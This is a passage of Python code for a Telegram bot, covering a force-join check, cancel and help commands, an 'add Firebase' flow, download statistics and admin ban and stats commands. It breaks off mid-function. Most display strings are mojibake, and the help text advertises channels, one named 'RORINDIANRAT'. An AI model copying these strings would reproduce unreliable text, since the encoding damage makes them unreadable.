            f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {ts['users']}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ¯')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {td}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´Â: {m}</b>\n"
            "</blockquote>\n"
            "<b>sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡:</b>"
        )
        kb = self.get_admin_menu_keyboard()
        if update.callback_query:
            try:
                await update.callback_query.answer()
            except Exception:
                pass
            try:
                await update.callback_query.edit_message_caption(
                    caption=msg, reply_markup=kb, parse_mode='HTML')
            except Exception:
                try:
                    await update.callback_query.edit_message_text(
                        text=msg, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    await update.callback_query.message.reply_photo(
                        photo="https://t.me/rajehshjsjs/33",
                        caption=msg, reply_markup=kb, parse_mode='HTML')
        else:
            await update.message.reply_photo(
                photo="https://t.me/rajehshjsjs/33",
                caption=msg, reply_markup=kb, parse_mode='HTML')

    # ---------- COMMANDS ----------
    async def start(self, update, ctx):
        uid = update.effective_user.id
        user = update.effective_user

        if is_user_banned(uid):
            await update.message.reply_text(
                f"<b>{emo('Ã°ÂÂÂ«')} ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â</b>", parse_mode='HTML')
            return

        asyncio.create_task(asyncio.to_thread(
            add_user, uid, user.username, user.first_name, user.last_name))

        self.update_user_data(uid, 'awaiting_firebase_add', None)
        self.update_user_data(uid, 'fb_adding_name', None)
        self.update_user_data(uid, 'download_mode', False)
        data = self.get_user_data(uid)

        if ctx.args and ctx.args[0] == 'admin':
            if is_admin(uid):
                await self.show_admin_panel(update, ctx)
            return

        if uid in _VERIFIED_USERS_CACHE:
            await self.show_main_menu(update, ctx)
            return

        _MEMBERSHIP_CACHE.pop(uid, None)
        nj = await self.check_membership(ctx, uid, force=True)
        if nj:
            self.set_user_verified(uid, False)
            await self.show_force_join(update, ctx)
            return
        self.set_user_verified(uid, True)
        await self.show_main_menu(update, ctx)

    async def cancel(self, update, ctx):
        uid = update.effective_user.id
        data = self.get_user_data(uid)
        cancelled_anything = False

        if self.active_batches.get(uid):
            self.active_batches[uid]['cancel'] = True
            await update.message.reply_text(f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â</b>", parse_mode='HTML')
            return

        if data.get('awaiting_firebase_add') or data.get('fb_adding_name'):
            self.update_user_data(uid, 'awaiting_firebase_add', None)
            self.update_user_data(uid, 'fb_adding_name', None)
            cancelled_anything = True

        if data.get('awaiting_broadcast'):
            self.update_user_data(uid, 'awaiting_broadcast', False)
            self.update_user_data(uid, 'broadcast_pin', False)
            await update.message.reply_text(
                f"<b>{emo('Ã¢ÂÂ')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â</b>", parse_mode='HTML')
            return

        if data.get('download_mode') or (data.get('stage') and data.get('stage') != 'main_menu'):
            self.clear_user_data(uid)
            cancelled_anything = True

        if cancelled_anything:
            await update.message.reply_text(
                f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃÂ!</b>\n\n"
                "<b>Aapka process cancel kar diya gaya hai. Send /start to begin.</b>",
                parse_mode='HTML')
        else:
            await update.message.reply_text(
                f"<b>{emo('Ã¢ÂÂ')} ÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â sÃ¡Â´ÂssÃÂªÃ¡Â´ÂÃÂ´</b>\n"
                "<b>sÃ¡Â´ÂÃÂ´Ã¡Â´Â /start Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂ¢ÃÂªÃÂ´.</b>", parse_mode='HTML')

    async def help(self, update, ctx):
        uid = update.effective_user.id
        data = self.get_user_data(uid)
        if not data.get('verified'):
            await self.show_force_join(update, ctx)
            return

        help_msg = (
            f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â</b>\n"
            "<blockquote>"
            f"<b>{emo('1Ã¯Â¸ÂÃ¢ÂÂ£')} Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂR ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂR</b>\n"
            f"<b>{emo('2Ã¯Â¸ÂÃ¢ÂÂ£')} Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n"
            f"<b>{emo('3Ã¯Â¸ÂÃ¢ÂÂ£')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â</b>\n"
            f"<b>{emo('4Ã¯Â¸ÂÃ¢ÂÂ£')} ÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´s Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss</b>\n"
            f"<b>{emo('5Ã¯Â¸ÂÃ¢ÂÂ£')} ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃªÂÂ°Ã¡Â´ÂÃ¡Â´ÂÃÂ sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n"
            "</blockquote>\n\n"
            f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs</b>\n"
            "<blockquote>"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Âs</b>\n"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂR sÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂs</b>\n"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂssÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss ÃÂªs Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n"
            "</blockquote>\n\n"
            f"<b>{emo('Ã¢ÂÂÃ¯Â¸Â')} ÃÂÃ¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂ ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â</b>\n"
            "<blockquote>"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃÂÃÂªs sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªs ÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ ÃªÂÂ°Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´Â¡ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â ÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´Ã¡Â´ÂÃÂ.</b>\n"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂsÃ¡Â´ÂÃÂs Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃÂ´sÃÂªÃÂÃÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂªÃÂ Ã¡Â´ÂÃ¡Â´Â¡ÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Âs.</b>\n"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss, Ã¡Â´ÂÃÂªsÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â ÃÂªÃ¡Â´ÂÃÂ ÃÂªs sÃ¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂÃÂªÃÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´.</b>\n"
            "<b>Ã¢ÂÂ¢ Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªs ÃÂ´Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃÂ´sÃÂªÃÂÃÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃÂªsÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃªÂÂ° Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs.</b>\n"
            "<b>Ã¢ÂÂ¢ ÃÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃÂªÃÂ´ÃÂ¢, ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªÃÂ´ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â¡s Ã¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´s.</b>\n"
            "</blockquote>\n\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Âs</b>\n"
            "<blockquote>"
            "<b>/start - sÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n"
            "<b>/help - sÃÂÃ¡Â´ÂÃ¡Â´Â¡ ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n"
            "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n"
            "<b>/addfirebase - Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n"
            "</blockquote>\n"
            "\n"
            "<b>ð¢ ð Channels:</b>\n"
            "<blockquote>"
            "<b>Main: <a href='https://t.me/RORINDIANRAT'>@RORINDIANRAT</a></b>\n"
            "<b>Group: <a href='https://t.me/teamxarmy87'>@teamxarmy87</a></b>\n"
            "<b>Chat: <a href='https://t.me/RORINDIACHAT'>@RORINDIACHAT</a></b>\n"
            "<b>ð Admin: @RORINDIA</b>\n"
            "</blockquote>\n"
            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
        )
        reply_markup = self.get_back_keyboard()
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(
                text=help_msg, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await update.message.reply_text(
                text=help_msg, reply_markup=reply_markup, parse_mode='HTML')

    async def cmd_add_firebase(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if is_banned(uid):
            return
        if is_maintenance_mode() and not is_admin(uid):
            await update.message.reply_text("Ã°ÂÂÂ Ã¯Â¸Â Bot is under maintenance.")
            return
        self.update_user_data(uid, 'awaiting_firebase_add', 'name')
        cancel_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data="cancel_firebase_add", style="danger")]
        ])
        await update.message.reply_text(
            f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
            "<blockquote>"
            "<b>sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1:</b> Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â\n"
            "<i>(Ã¡Â´Â.ÃÂ¢. Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ1)</i>\n\n"
            "<b>Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ:</b> Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel"
            "</blockquote>",
            reply_markup=cancel_kb,
            parse_mode='HTML'
        )

    async def my_info(self, update, ctx):
        uid = update.effective_user.id
        data = self.get_user_data(uid)
        if not data.get('verified'):
            await self.show_force_join(update, ctx)
            return

        s = get_user_stats(uid)
        msg = (
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â</b>\n"
            "<blockquote>"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂsÃ¡Â´ÂÃÂ ÃÂªÃ¡Â´Â: <code>{uid}</code></b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {s['total_downloads']}</b>\n"
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {s['today_downloads']}</b>\n"
            f"<b>{emo('Ã¢Â­Â')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {'ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â' if s['is_banned'] else 'Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â'}</b>\n"
            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â: {'ÃÂÃ¡Â´Âs' if s['verified'] else 'ÃÂ´Ã¡Â´Â'}</b>\n"
            "</blockquote>"
        )
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(
                text=msg, reply_markup=self.get_back_keyboard(), parse_mode='HTML')
        else:
            await update.message.reply_text(
                text=msg, reply_markup=self.get_back_keyboard(), parse_mode='HTML')

    # ---------- ADMIN COMMANDS ----------
    async def admin_ban_user(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            return
        if not ctx.args:
            await update.message.reply_text("Usage: /ban <user_id>")
            return
        try:
            bid = int(ctx.args[0])
            ban_user(bid)
            await update.message.reply_text(f"Ã¢ÂÂ Banned {bid}")
        except ValueError:
            await update.message.reply_text("Ã¢ÂÂ Invalid ID")

    async def admin_unban_user(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            return
        if not ctx.args:
            await update.message.reply_text("Usage: /unban <user_id>")
            return
        try:
            bid = int(ctx.args[0])
            unban_user(bid)
            await update.message.reply_text(f"Ã¢ÂÂ Unbanned {bid}")
        except ValueError:
            await update.message.reply_text("Ã¢ÂÂ Invalid ID")

    async def admin_stats(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            return
        tu = get_all_users_count()
        bu = get_banned_users_count()
        ts = get_today_stats()
        td = get_total_stats()
        msg = (
            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs</b>\n"
            "<blockquote>"
            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {tu}</b>\n"
            f"<b>ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â: {bu}</b>\n"
            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â: {tu - bu}</b>\n"
            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {ts['downloads']}</b>\n"
            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {ts['users']}</b>\n"
            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {td}</b>\n"
            "</blockquote>"
        )
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(
                text=msg, reply_markup=self.get_back_keyboard(), parse_mode='HTML')
        else:
            await update.message.reply_text(
                text=msg, reply_markup=self.get_back_keyboard(), parse_mode='HTML')

    async def admin_user_info(self, update, ctx):
        uid = update.effective_user.id
        if not is_admin(uid):
            return
        if not ctx.args:
            await update.message.reply_text("Usage: /userinfo <user_id>")
            return
        try:
            tid = int(ctx.args[0])
            s = get_user_stats(tid)
            msg = (
                f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂsÃ¡Â´ÂÃÂ ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n"
                "<blockquote>"
                f"<b>Ã°ÂÂÂ {tid}</b>\n"
                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {s['total_downloads']}</b>\n"
                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {s['today_downloads']}</b>\n"
